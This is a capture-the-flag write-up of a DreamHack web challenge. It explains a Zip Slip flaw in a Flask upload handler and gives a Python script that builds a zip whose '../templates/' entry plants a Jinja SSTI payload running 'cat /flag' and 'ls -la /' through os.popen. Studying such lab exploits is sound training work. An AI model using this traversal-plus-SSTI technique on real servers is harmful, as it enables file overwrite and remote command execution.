# 거북이 — DreamHack

> **Room / Challenge:** 거북이 (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** 거북이 (web)
- **Link**: `https://dreamhack.io/wargame/challenges/2194`
- **Level:** `2`
- **Date:** `25-11-2025`

---

## Goal

Leveraging Zip Slip vulnerability and get the flag.

## My Solution

The app is vulnerable to Zip Slip vulnerability, the vulnerable block of code in `/upload`:

```python
if (f.filename or "").lower().endswith(".zip") or "zip" in (f.content_type or "").lower():
    data = f.read()
    zf = zipfile.ZipFile(io.BytesIO(data))
    names = []
    for info in zf.infolist():
        target = UPLOAD_DIR / info.filename # <--- VULNERABLE CODE HERE
        if info.is_dir():
            target.mkdir(parents=True, exist_ok=True)
        else:
            target.parent.mkdir(parents=True, exist_ok=True)
            with zf.open(info) as src, open(target, "wb") as dst:
                shutil.copyfileobj(src, dst)
        names.append(info.filename)
    return jsonify(ok=True, saved=names)
```

The app doesn't have any filetering or sanitizing so if we upload with a file with name `../templates/test.html`, it will replace the `test.html` in templates folder with our file, then since this is a Flask app, we can use SSTI to get the flag content.

The Python code to create an exploit `.zip` file:

```python
import zipfile
import io

def create_exploit():
    ssti_payload = """
    <!DOCTYPE html>
    <html>
    <head><title>Pwned</title></head>
    <body>
    <h1>Flag Output:</h1>
    <pre>
    {{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
    </pre>
    <hr>
    <h3>Root Directory Listing:</h3>
    <pre>
    {{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() }}
    </pre>
    </body>
    </html>
    """
    target_path = "../templates/test.html"

    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(target_path, ssti_payload)

    filename = "turtle_exploit.zip"
    with open(filename, "wb") as f:
        f.write(zip_buffer.getvalue())

    print(f"Generated '{filename}'")

if __name__ == "__main__":
    create_exploit()
```

Upload the created `turtle_exploit.zip` and visit `/test.html` to get the flag:

![Guide image](./screenshots/1.png)
